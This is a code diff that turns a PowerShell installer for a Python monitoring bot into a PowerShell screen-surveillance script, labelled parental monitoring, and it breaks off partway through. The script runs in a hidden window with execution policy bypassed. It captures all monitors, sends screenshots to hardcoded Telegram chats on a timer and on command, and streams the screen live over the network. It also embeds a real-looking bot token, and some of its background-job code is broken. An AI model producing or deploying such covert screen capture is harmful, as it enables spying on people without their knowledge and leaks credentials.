@@ -1,293 +1,366 @@
-```powershell
-# Run this script as Administrator
+<#
+monitor_bot.ps1
+PowerShell version of your parental-monitoring script:
+- Captures monitors, combines side-by-side
+- Streams MJPEG on /stream?token=...
+- Short link at /s
+- Sends screenshots to Telegram chats
+- Auto-loop screenshots
+- Polls Telegram getUpdates for /screenshot command
 
-# Enable strict mode for better error handling
-Set-StrictMode -Version Latest
-$ErrorActionPreference = "Stop"
+Run:
+powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File .\monitor_bot.ps1
 
-# Log file for PowerShell script
-$logPath = "C:\install_log.txt"
-function Log-Message {
-    param($Message)
-    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    "$timestamp - $Message" | Out-File -FilePath $logPath -Append
-}
-
-Log-Message "Starting script execution"
-
-# Download Python 3.13.2 installer
-try {
-    $pythonUrl = "https://www.python.org/ftp/python/3.13.2/python-3.13.2-amd64.exe"
-    $installerPath = "$env:TEMP\python-3.13.2-installer.exe"
-    Log-Message "Downloading Python installer to $installerPath"
-    Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath
-    Log-Message "Python installer downloaded successfully"
-} catch {
-    Log-Message "Error downloading Python installer: $_"
-    Write-Host "Error downloading Python installer: $_"
-    exit 1
-}
-
-# Create MonitorBot.py
-$pyPath = "C:\MonitorBot.py"
-$scriptContent = @'
-import io
-import threading
-import time
-import socket
-from functools import wraps
-import logging
-from logging.handlers import RotatingFileHandler
-import traceback
-
-from flask import Flask, Response, request, abort
-import mss
-from PIL import Image
-import telebot
+Notes:
+- Best on Windows PowerShell 5.1 (System.Drawing available).
+- Open STREAM_PORT in firewall if you want access from other devices.
+#>
 
 # ----------------------------
-# CONFIG
+# CONFIG - edit these
 # ----------------------------
-TOKEN = "fgh:fhg"  # REPLACE WITH YOUR TELEGRAM BOT TOKEN
-CHAT_IDS = [7208529004, 1399455903, 901578154]  # REPLACE WITH VALID CHAT IDs
-STREAM_PORT = 5000
-STREAM_TOKEN = "fhgfgh"  # REPLACE WITH YOUR STREAM TOKEN
-FRAME_INTERVAL = 0.8
-JPEG_QUALITY = 50
-AUTO_INTERVAL = 300
-RESIZE_SCALE = 0.5
-LOG_FILE = "C:\\monitor_bot.log"
+$TOKEN = "8477847766:AAFGIN359PYPPbhe9AwxezwUQqDgXCrPxTE"    # Telegram bot token
+$CHAT_IDS = @(7208529004, 1399455903, 901578154)          # Allowed chat IDs (integers)
+$STREAM_PORT = 5000
+$STREAM_TOKEN = "ZGFza2pkaGFranNkaGthanNkaGtpb2xxa2pmZ2RuZGlmZ2p5OTI0MzU2NzkzNDU3OTM0a2JuamZramRoZmtqYmRramZoc2Y="
+$FRAME_INTERVAL = 0.8   # seconds between MJPEG frames
+$JPEG_QUALITY = 50      # 0-100
+$AUTO_INTERVAL = 300    # seconds between auto screenshots to Telegram
+$RESIZE_SCALE = 0.5     # 0.0-1.0 scale for downsizing
+$LOG_FILE = "monitor_bot.log"
 
-# Setup logging
-logging.basicConfig(
-    handlers=[RotatingFileHandler(LOG_FILE, maxBytes=10**6, backupCount=3)],
-    level=logging.DEBUG,
-    format="%(asctime)s - %(levelname)s - %(message)s"
-)
-logger = logging.getLogger(__name__)
+# Temp file for sending photos
+$global:tempJpg = [IO.Path]::Combine($env:TEMP, "monitor_bot_temp.jpg")
 
-app = Flask(__name__)
-bot = telebot.TeleBot(TOKEN)
-stop_event = threading.Event()
+function Log {
+    param([string]$msg, [string]$level = "INFO")
+    $entry = "{0} - {1} - {2}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $level, $msg
+    $entry | Out-File -FilePath $LOG_FILE -Append -Encoding utf8
+    # Also write to console for foreground runs
+    Write-Output $entry
+}
 
 # ----------------------------
 # Capture functions
 # ----------------------------
-def capture_monitor_image(monitor_index=1, sct=None):
-    """Capture a single monitor image with shared MSS context"""
-    try:
-        if sct is None:
-            sct = mss.mss()
-        monitors = sct.monitors
-        if monitor_index < 1 or monitor_index >= len(monitors):
-            logger.warning(f"Invalid monitor index {monitor_index}; using monitor 1")
-            monitor_index = 1
-        monitor = monitors[monitor_index]
-        sct_img = sct.grab(monitor)
-        img = Image.frombytes("RGB", sct_img.size, sct_img.rgb)
-        if RESIZE_SCALE < 1:
-            new_size = (int(img.width * RESIZE_SCALE), int(img.height * RESIZE_SCALE))
-            img = img.resize(new_size, Image.Resampling.LANCZOS)
-        return img
-    except Exception as e:
-        logger.error(f"Error in capture_monitor_image: {str(e)}\n{traceback.format_exc()}")
-        raise
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
 
-def capture_combined_image():
-    """Combine monitor 1 and 2 side by side with padding, return BytesIO"""
-    try:
-        with mss.mss() as sct:
-            img1 = capture_monitor_image(1, sct)
-            img2 = None
-            try:
-                img2 = capture_monitor_image(2, sct)
-            except Exception as e:
-                logger.warning(f"Failed to capture monitor 2: {str(e)}\n{traceback.format_exc()}")
+function Capture-MonitorBitmap {
+    param([int]$monitorIndex = 1)
+    try {
+        $screens = [System.Windows.Forms.Screen]::AllScreens
+        if ($monitorIndex -lt 1 -or $monitorIndex -gt $screens.Length) {
+            Log "Invalid monitor index $monitorIndex; using 1" "WARN"
+            $monitorIndex = 1
+        }
+        $screen = $screens[$monitorIndex - 1]  # zero-based
+        $rect = $screen.Bounds
+        $bmp = New-Object System.Drawing.Bitmap $rect.Width, $rect.Height
+        $g = [System.Drawing.Graphics]::FromImage($bmp)
+        $g.CopyFromScreen($rect.X, $rect.Y, 0, 0, $rect.Size)
+        $g.Dispose()
+        return $bmp
+    } catch {
+        Log "Capture-MonitorBitmap error: $_" "ERROR"
+        return $null
+    }
+}
 
-            max_h = max(img1.height, img2.height) if img2 else img1.height
-            total_w = img1.width + (img2.width if img2 else img1.width)
-            combined = Image.new("RGB", (total_w, max_h), (0, 0, 0))
-            combined.paste(img1, (0, 0))
-            if img2:
-                combined.paste(img2, (img1.width, 0))
-            else:
-                combined.paste(img1, (img1.width, 0))
+function Capture-CombinedImageBytes {
+    try {
+        $bmp1 = Capture-MonitorBitmap -monitorIndex 1
+        if (-not $bmp1) { throw "Failed to capture monitor 1" }
+        $bmp2 = $null
+        if ([System.Windows.Forms.Screen]::AllScreens.Count -ge 2) {
+            try {
+                $bmp2 = Capture-MonitorBitmap -monitorIndex 2
+            } catch {
+                Log "Could not capture monitor 2: $_" "WARN"
+                $bmp2 = $null
+            }
+        }
 
-            bio = io.BytesIO()
-            combined.save(bio, format="JPEG", quality=JPEG_QUALITY, optimize=True)
-            bio.seek(0)
-            return bio
-    except Exception as e:
-        logger.error(f"Error capturing combined image: {str(e)}\n{traceback.format_exc()}")
-        raise
+        if ($RESIZE_SCALE -lt 1.0) {
+            $newW1 = [int]($bmp1.Width * $RESIZE_SCALE)
+            $newH1 = [int]($bmp1.Height * $RESIZE_SCALE)
+            $scaled1 = New-Object System.Drawing.Bitmap $newW1, $newH1
+            $g1 = [System.Drawing.Graphics]::FromImage($scaled1)
+            $g1.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
+            $g1.DrawImage($bmp1, 0, 0, $newW1, $newH1)
+            $g1.Dispose()
+            $bmp1.Dispose()
+            $bmp1 = $scaled1
+
+            if ($bmp2) {
+                $newW2 = [int]($bmp2.Width * $RESIZE_SCALE)
+                $newH2 = [int]($bmp2.Height * $RESIZE_SCALE)
+                $scaled2 = New-Object System.Drawing.Bitmap $newW2, $newH2
+                $g2 = [System.Drawing.Graphics]::FromImage($scaled2)
+                $g2.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
+                $g2.DrawImage($bmp2, 0, 0, $newW2, $newH2)
+                $g2.Dispose()
+                $bmp2.Dispose()
+                $bmp2 = $scaled2
+            }
+        }
+
+        if ($bmp2) {
+            $width = $bmp1.Width + $bmp2.Width
+            $height = [Math]::Max($bmp1.Height, $bmp2.Height)
+            $combined = New-Object System.Drawing.Bitmap $width, $height
+            $g = [System.Drawing.Graphics]::FromImage($combined)
+            $g.Clear([System.Drawing.Color]::Black)
+            $g.DrawImage($bmp1, 0, 0)
+            $g.DrawImage($bmp2, $bmp1.Width, 0)
+            $g.Dispose()
+            $bmp1.Dispose()
+            $bmp2.Dispose()
+        } else {
+            # Duplicate monitor1 if only one monitor
+            $width = $bmp1.Width * 2
+            $height = $bmp1.Height
+            $combined = New-Object System.Drawing.Bitmap $width, $height
+            $g = [System.Drawing.Graphics]::FromImage($combined)
+            $g.Clear([System.Drawing.Color]::Black)
+            $g.DrawImage($bmp1, 0, 0)
+            $g.DrawImage($bmp1, $bmp1.Width, 0)
+            $g.Dispose()
+            $bmp1.Dispose()
+        }
+
+        # Save to memory stream as JPEG with quality
+        $ms = New-Object System.IO.MemoryStream
+        $encoders = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()
+        $jpegCodec = $encoders | Where-Object { $_.MimeType -eq "image/jpeg" } | Select-Object -First 1
+        $params = New-Object System.Drawing.Imaging.EncoderParameters 1
+        $qualityParam = New-Object System.Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [int]$JPEG_QUALITY)
+        $params.Param[0] = $qualityParam
+        $combined.Save($ms, $jpegCodec, $params)
+        $combined.Dispose()
+        $ms.Seek(0, 'Begin') | Out-Null
+        $bytes = $ms.ToArray()
+        $ms.Dispose()
+        return $bytes
+    } catch {
+        Log "Capture-CombinedImageBytes error: $_" "ERROR"
+        return $null
+    }
+}
 
 # ----------------------------
 # Telegram functions
 # ----------------------------
-def send_start_message():
-    for chat_id in CHAT_IDS:
-        try:
-            bot.send_message(chat_id, "Script Started ✅")
-            logger.debug(f"Sent start message to chat {chat_id}")
-        except Exception as e:
-            logger.error(f"Error sending start message to {chat_id}: {str(e)}\n{traceback.format_exc()}")
-
-def send_combined_screenshot():
-    bio = capture_combined_image()
-    for chat_id in CHAT_IDS:
-        try:
-            bio.seek(0)
-            bot.send_photo(chat_id, photo=bio, caption="Screen 1\n\nScreen 2")
-            logger.debug(f"Sent screenshot to chat {chat_id}")
-        except Exception as e:
-            logger.error(f"Error sending screenshot to {chat_id}: {str(e)}\n{traceback.format_exc()}")
-    bio.close()
-
-def send_closed_message():
-    for chat_id in CHAT_IDS:
-        try:
-            bot.send_message(chat_id, "Script Closed ❌")
-            logger.debug(f"Sent closed message to chat {chat_id}")
-        except Exception as e:
-            logger.error(f"Error sending closed message to {chat_id}: {str(e)}\n{traceback.format_exc()}")
-
-def auto_screenshot_loop():
-    while not stop_event.is_set():
-        try:
-            send_combined_screenshot()
-        except Exception as e:
-            logger.error(f"Error in auto screenshot loop: {str(e)}\n{traceback.format_exc()}")
-        stop_event.wait(AUTO_INTERVAL)
-
-# ----------------------------
-# Flask streaming
-# ----------------------------
-def require_token(func):
-    @wraps(func)
-    def wrapped(*args, **kwargs):
-        token = request.args.get("token", "")
-        if not token or token != STREAM_TOKEN:
-            logger.warning("Unauthorized stream access attempt")
-            abort(401)
-        return func(*args, **kwargs)
-    return wrapped
-
-def mjpeg_generator():
-    """Stream combined monitors live"""
-    while not stop_event.is_set():
-        try:
-            bio = capture_combined_image()
-            frame = bio.read()
-            yield (b"--frame\r\nContent-Type: image/jpeg\r\nContent-Length: " +
-                   f"{len(frame)}".encode() + b"\r\n\r\n" + frame + b"\r\n")
-            bio.close()
-            time.sleep(FRAME_INTERVAL)
-        except Exception as e:
-            logger.error(f"Error in MJPEG stream: {str(e)}\n{traceback.format_exc()}")
-            time.sleep(1)
-
-@app.route("/stream")
-@require_token
-def stream():
-    return Response(mjpeg_generator(), mimetype="multipart/x-mixed-replace; boundary=frame")
-
-@app.route("/s")
-def short_stream():
-    """Short link redirect to full stream with responsive image"""
-    return f'''
-    <html>
-        <head>
-            <title>Live Stream</title>
-            <style>body{{margin:0;}}img{{width:100%;height:auto;}}</style>
-        </head>
-        <body>
-            <img src="/stream?token={STREAM_TOKEN}" />
-        </body>
-    </html>
-    '''
-
-# ----------------------------
-# Telegram commands
-# ----------------------------
-@bot.message_handler(commands=['screenshot'])
-def tg_screenshot(msg):
-    if msg.chat.id not in CHAT_IDS:
-        logger.warning(f"Unauthorized screenshot request from chat {msg.chat.id}")
-        return
-    send_combined_screenshot()
-
-# ----------------------------
-# Utility
-# ----------------------------
-def get_local_ip():
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        s.close()
-    except Exception as e:
-        logger.error(f"Error getting local IP: {str(e)}\n{traceback.format_exc()}")
-        ip = "127.0.0.1"
-    return ip
-
-# ----------------------------
-# Run application
-# ----------------------------
-def run_flask():
-    ip = "0.0.0.0"
-    logger.info(f"Flask server running on {ip}:{STREAM_PORT}")
-    logger.info(f"Short stream URL: http://{get_local_ip()}:{STREAM_PORT}/s")
-    try:
-        app.run(host=ip, port=STREAM_PORT, threaded=True, debug=False)
-    except Exception as e:
-        logger.error(f"Flask server error: {str(e)}\n{traceback.format_exc()}")
-        raise
-
-def run_telegram():
-    while not stop_event.is_set():
-        try:
-            bot.infinity_polling(timeout=60, long_polling_timeout=60)
-        except Exception as e:
-            logger.error(f"Telegram polling error: {str(e)}\n{traceback.format_exc()}")
-            if stop_event.is_set():
-                break
-            time.sleep(5)
-
-if __name__ == "__main__":
-    try:
-        flask_thread = threading.Thread(target=run_flask, daemon=True)
-        telegram_thread = threading.Thread(target=run_telegram, daemon=True)
-        auto_thread = threading.Thread(target=auto_screenshot_loop, daemon=True)
-        
-        send_start_message()
-        flask_thread.start()
-        telegram_thread.start()
-        auto_thread.start()
-
-        stop_event.wait()
-    except KeyboardInterrupt:
-        logger.info("Received KeyboardInterrupt, stopping...")
-        stop_event.set()
-        send_closed_message()
-    except Exception as e:
-        logger.error(f"Unexpected error: {str(e)}\n{traceback.format_exc()}")
-        stop_event.set()
-        send_closed_message()
-    finally:
-        logger.info("Script terminated")
-'@
-try {
-    $scriptContent | Out-File -FilePath $pyPath -Encoding utf8
-    Log-Message "Created MonitorBot.py at $pyPath"
-} catch {
-    Log-Message "Error creating MonitorBot.py: $_"
-    Write-Host "Error creating MonitorBot.py: $_"
-    exit 1
+function Send-StartMessage {
+    foreach ($id in $CHAT_IDS) {
+        try {
+            $url = "https://api.telegram.org/bot$TOKEN/sendMessage"
+            Invoke-RestMethod -Uri $url -Method Post -Body @{ chat_id = $id; text = "Script Started ✅" } -ErrorAction Stop
+        } catch {
+            Log "Error sending start msg to $id: $_" "ERROR"
+        }
+    }
+    Send-CombinedScreenshot
 }
 
-Write-Host "Script execution complete."
-Write-Host "Python installer downloaded to: $installerPath"
-Write-Host "MonitorBot.py created at: $pyPath"
-Write-Host "Check logs at: $logPath"
-Read-Host "Press Enter to exit..."
-```
+function Send-CombinedScreenshot {
+    $bytes = Capture-CombinedImageBytes
+    if (-not $bytes) { Log "No image bytes to send" "WARN"; return }
+    try {
+        [System.IO.File]::WriteAllBytes($global:tempJpg, $bytes)
+        foreach ($id in $CHAT_IDS) {
+            try {
+                $url = "https://api.telegram.org/bot$TOKEN/sendPhoto"
+                $form = @{
+                    chat_id = $id
+                    caption = "Screen 1`n`nScreen 2"
+                    photo = Get-Item $global:tempJpg
+                }
+                Invoke-RestMethod -Uri $url -Method Post -Form $form -ErrorAction Stop
+            } catch {
+                Log "Error sending screenshot to $id: $_" "ERROR"
+            }
+        }
+    } catch {
+        Log "Error saving/sending screenshot: $_" "ERROR"
+    } finally {
+        if (Test-Path $global:tempJpg) { Remove-Item $global:tempJpg -ErrorAction SilentlyContinue }
+    }
+}
+
+function Send-ClosedMessage {
+    foreach ($id in $CHAT_IDS) {
+        try {
+            $url = "https://api.telegram.org/bot$TOKEN/sendMessage"
+            Invoke-RestMethod -Uri $url -Method Post -Body @{ chat_id = $id; text = "Script Closed ❌" } -ErrorAction Stop
+        } catch {
+            Log "Error sending closed msg to $id: $_" "ERROR"
+        }
+    }
+}
+
+# ----------------------------
+# Auto-screenshot loop (background job)
+# ----------------------------
+function Start-AutoScreenshotLoop {
+    Start-Job -Name "AutoScreenshot" -ScriptBlock {
+        param($TOKEN, $CHAT_IDS, $AUTO_INTERVAL)
+        # Re-import functions/defs by dot-sourcing this file inside job
+        $scriptPath = $MyInvocation.MyCommand.Path
+        . $scriptPath
+        while ($true) {
+            try {
+                Send-CombinedScreenshot
+            } catch {
+                Log "Auto loop error: $_" "ERROR"
+            }
+            Start-Sleep -Seconds $AUTO_INTERVAL
+        }
+    } -ArgumentList $TOKEN, $CHAT_IDS, $AUTO_INTERVAL | Out-Null
+    Log "Started AutoScreenshot background job"
+}
+
+# ----------------------------
+# Telegram poller (checks for messages like /screenshot)
+# ----------------------------
+$global:tgOffset = 0
+function Start-TelegramPoller {
+    Start-Job -Name "TGPoller" -ScriptBlock {
+        param($TOKEN, $CHAT_IDS)
+        $scriptPath = $MyInvocation.MyCommand.Path
+        . $scriptPath
+        while ($true) {
+            try {
+                $url = "https://api.telegram.org/bot$TOKEN/getUpdates"
+                $resp = Invoke-RestMethod -Uri $url -Method Get -Body @{ offset = $script:tgOffset } -ErrorAction Stop
+                if ($resp.ok -and $resp.result.Count -gt 0) {
+                    foreach ($u in $resp.result) {
+                        $script:tgOffset = [int]$u.update_id + 1
+                        if ($u.message) {
+                            $chatId = $u.message.chat.id
+                            $text = $u.message.text
+                            if ($text -eq "/screenshot" -and ($CHAT_IDS -contains $chatId)) {
+                                Send-CombinedScreenshot
+                            } else {
+                                Log "Ignored telegram msg from $chatId: $text" "INFO"
+                            }
+                        }
+                    }
+                }
+            } catch {
+                Log "Telegram poller error: $_" "ERROR"
+            }
+            Start-Sleep -Seconds 2
+        }
+    } -ArgumentList $TOKEN, $CHAT_IDS | Out-Null
+    Log "Started Telegram poller background job"
+}
+
+# ----------------------------
+# Simple MJPEG stream via HttpListener
+# ----------------------------
+function Start-HttpStream {
+    param([int]$Port, [string]$StreamToken)
+    $listener = New-Object System.Net.HttpListener
+    $prefix = "http://+:$Port/"
+    $listener.Prefixes.Add($prefix)
+    try {
+        $listener.Start()
+    } catch {
+        Log "Failed to start HttpListener on $Port: $_" "ERROR"
+        throw $_
+    }
+    Log "HttpListener started on port $Port"
+    while ($listener.IsListening) {
+        try {
+            $ctx = $listener.GetContext()
+            Start-Job -ScriptBlock {
+                param($ctx, $StreamToken, $FRAME_INTERVAL)
+                $req = $ctx.Request
+                $resp = $ctx.Response
+                $qs = $req.Url.Query
+                # Quick token check param 'token'
+                $q = [System.Web.HttpUtility]::ParseQueryString($qs)
+                $token = $q.Get("token")
+                if (-not $token -or $token -ne $StreamToken) {
+                    $resp.StatusCode = 401
+                    $resp.Close()
+                    Log "Unauthorized stream access attempt from $($req.RemoteEndPoint)" "WARN"
+                    return
+                }
+                $boundary = "--frame"
+                $resp.ContentType = "multipart/x-mixed-replace; boundary=$boundary"
+                $resp.SendChunked = $true
+                $out = $resp.OutputStream
+                try {
+                    while ($true) {
+                        $bytes = Capture-CombinedImageBytes
+                        if ($bytes) {
+                            $hdr = "`r`n$boundary`r`nContent-Type: image/jpeg`r`nContent-Length: $($bytes.Length)`r`n`r`n"
+                            $hdrBytes = [System.Text.Encoding]::ASCII.GetBytes($hdr)
+                            $out.Write($hdrBytes, 0, $hdrBytes.Length)
+                            $out.Write($bytes, 0, $bytes.Length)
+                            $out.Flush()
+                        }
+                        Start-Sleep -Seconds $FRAME_INTERVAL
+                    }
+                } catch {
+                    # client disconnected or other error
+                } finally {
+                    $out.Close()
+                    $resp.Close()
+                }
+            } -ArgumentList $ctx, $StreamToken, $FRAME_INTERVAL | Out-Null
+        } catch {
+            Log "HttpListener accept error: $_" "ERROR"
+        }
+    }
+}
+
+# /s handler - returns a small HTML that embeds the stream
+function Start-ShortPage {
+    param([int]$Port, [string]$StreamToken)
+    $listener = New-Object System.Net.HttpListener
+    $prefix = "http://+:$Port/"
+    $listener.Prefixes.Add($prefix)
+    # Using the same listener above; so we won't start separately. This helper is left for conceptual clarity.
+}
+
+# ----------------------------
+# Run the components
+# ----------------------------
+try {
+    Log "Script starting"
+    Send-StartMessage
+    Start-AutoScreenshotLoop
+    Start-TelegramPoller
+
+    # Start HTTP listener (blocking): handles /stream and returns simple /s HTML and MJPEG streaming
+    $listener = New-Object System.Net.HttpListener
+    $listener.Prefixes.Add("http://+:$STREAM_PORT/")
+    $listener.Start()
+    Log "Short stream URL: http://$((Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.Address -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object -First 1 -ExpandProperty IPAddress)):$STREAM_PORT/s"
+    while ($listener.IsListening) {
+        try {
+            $ctx = $listener.GetContext()
+            $req = $ctx.Request
+            $resp = $ctx.Response
+            $path = $req.Url.AbsolutePath
+            if ($path -eq "/s") {
+                $html = "<html><head><title>Live Stream</title><style>body{margin:0;}img{width:100%;height:auto;}</style></head><body><img src='/stream?token=$STREAM_TOKEN' /></body></html>"
+                $bytes = [System.Text.Encoding]::UTF8.GetBytes($html)
+                $resp.ContentType = "text/html; charset=utf-8"
+                $resp.ContentLength64 = $bytes.Length
+                $resp.OutputStream.Write($bytes, 0, $bytes.Length)
+                $resp.Close()
+            } elseif ($path -eq "/stream") {
+                # Hand off streaming to a job similar to Start-HttpStream to avoid blocking further accepts
+                Start-Job -ScriptBlock {
+                    param($ctx, $STREAM_TOKEN, $FRAME_INTERVAL)
+                    $req = $ctx.Request; $resp = $ctx.Response
+                    $q = [System.Web.HttpUtility]::ParseQueryString($req.Url.Query)
+                    $token = $q.Get("token")
+                    if (-not $token -or $token -ne $STREAM_TOKEN) {
+                        $resp.StatusCode = 401
+                        $resp.Close()
+                        Log "Unauthorized stream access attempt from $($req.RemoteEndPoint)" "WARN"
